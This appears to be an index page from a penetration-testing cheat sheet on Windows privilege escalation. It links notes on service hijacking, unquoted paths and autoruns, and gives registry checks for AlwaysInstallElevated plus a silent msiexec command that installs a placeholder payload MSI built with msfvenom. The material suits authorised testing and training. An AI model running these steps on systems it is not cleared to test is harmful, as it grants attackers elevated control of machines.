# Windows services and installer policy

| Control | File |
| --- | --- |
| Write the service executable on disk | [service-binary-hijacking](service-binary-hijacking.md) |
| Change the service config (`binPath`) | [service-permissions](service-permissions.md) |
| Write a path Windows tries before the real exe | [unquoted-service-paths](unquoted-service-paths.md) |
| Scheduled task / autorun | [scheduled-tasks-and-autoruns](scheduled-tasks-and-autoruns.md) |

## Installer policy
Both values must be `1`:
```powershell
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```cmd
msiexec /quiet /qn /i <PAYLOAD>.msi
```
- Build the MSI with msfvenom → [payload formats](../foothold/shells.md#msfvenom-payloads).
